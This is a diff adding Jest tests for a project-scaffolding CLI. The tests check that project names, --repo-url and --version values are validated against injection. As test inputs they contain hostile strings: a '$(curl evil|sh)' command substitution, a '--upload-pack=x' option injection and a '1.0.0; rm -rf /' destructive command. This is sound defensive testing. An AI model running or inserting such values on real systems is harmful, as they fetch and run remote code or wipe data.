@@ -206,6 +206,41 @@ describe("ProjectCreatorFactory", () => {
       expect(name).toBe("no-dot-name");
     });
 
+    it("should error and prompt when the CLI-arg name contains shell metacharacters", async () => {
+      existsSyncImpl = () => false;
+      textAnswer = "safe-name";
+
+      const name = await getProjectName(["x$(curl evil|sh)"], "/tmp");
+
+      expect(mockLogMessage).toHaveBeenCalledTimes(1);
+      expect(mockLogMessage.mock.calls[0]![0]).toMatchObject({ type: "error" });
+      expect(mockLogMessage.mock.calls[0]![0].message).toContain(
+        "may only contain",
+      );
+      expect(mockText).toHaveBeenCalledTimes(1);
+      expect(name).toBe("safe-name");
+    });
+
+    it("should error and prompt when the CLI-arg name starts with a hyphen", async () => {
+      existsSyncImpl = () => false;
+      textAnswer = "safe-name";
+
+      const name = await getProjectName(["--upload-pack=x"], "/tmp");
+
+      expect(mockLogMessage.mock.calls[0]![0]).toMatchObject({ type: "error" });
+      expect(name).toBe("safe-name");
+    });
+
+    it("should error and prompt when the CLI-arg name contains spaces", async () => {
+      existsSyncImpl = () => false;
+      textAnswer = "safe-name";
+
+      const name = await getProjectName(["my app"], "/tmp");
+
+      expect(mockLogMessage.mock.calls[0]![0]).toMatchObject({ type: "error" });
+      expect(name).toBe("safe-name");
+    });
+
     it("should slugify and lowercase the prompted answer", async () => {
       textAnswer = "My New Project";
       const name = await getProjectName([], "/tmp");
@@ -252,6 +287,14 @@ describe("ProjectCreatorFactory", () => {
         const validate = lastTextOpts.validate;
         expect(validate("good-name")).toBeUndefined();
       });
+
+      it("should reject names whose slug still contains unsafe characters", async () => {
+        await getProjectName([], "/tmp");
+        const validate = lastTextOpts.validate;
+        // slugify("x$(curl evil|sh)") -> "xdollar(curl-evilorsh)"; the parens
+        // survive slugify and must be caught by the safe-slug pattern.
+        expect(validate("x$(curl evil|sh)")).toContain("may only contain");
+      });
     });
 
     it("should cancel and exit(0) when the prompt is cancelled", async () => {
@@ -295,6 +338,42 @@ describe("ProjectCreatorFactory", () => {
       expect(
         mockLogMessage.mock.calls.some((c) => c[0]?.type === "error"),
       ).toBe(true);
+    });
+
+    it("should log an error for an injectable --repo-url", async () => {
+      await ProjectCreatorFactory.create(["app"], {
+        module: false,
+        directoryPath: "/tmp",
+        repoUrl: "https://x.com/$(curl evil|sh)",
+      });
+      const errorCall = mockLogMessage.mock.calls.find(
+        (c) => c[0]?.type === "error",
+      );
+      expect(errorCall![0].message).toContain("Invalid --repo-url");
+    });
+
+    it("should accept a valid --repo-url and --version without errors", async () => {
+      await ProjectCreatorFactory.create(["app"], {
+        module: false,
+        directoryPath: "/tmp",
+        repoUrl: "https://github.com/damatjs/damat-starter-default",
+        version: "1.2.3",
+      });
+      expect(
+        mockLogMessage.mock.calls.some((c) => c[0]?.type === "error"),
+      ).toBe(false);
+    });
+
+    it("should log an error for an injectable --version", async () => {
+      await ProjectCreatorFactory.create(["app"], {
+        module: false,
+        directoryPath: "/tmp",
+        version: "1.0.0; rm -rf /",
+      });
+      const errorCall = mockLogMessage.mock.calls.find(
+        (c) => c[0]?.type === "error",
+      );
+      expect(errorCall![0].message).toContain("Invalid --version");
     });
   });
 });
